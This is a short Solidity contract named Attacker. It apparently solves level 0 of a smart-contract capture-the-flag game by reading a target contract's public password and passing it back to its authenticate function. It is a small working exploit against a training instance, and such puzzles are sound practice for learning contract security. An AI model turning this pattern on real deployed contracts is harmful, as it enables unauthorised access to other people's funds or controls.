// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/level00.sol";

contract Attacker {
    Instance level0 = Instance(0x080f1E5F240DA0d80A296a1693Aa16FF032D0894);

    function exploit() external {
        level0.authenticate(level0.password());
    }
}
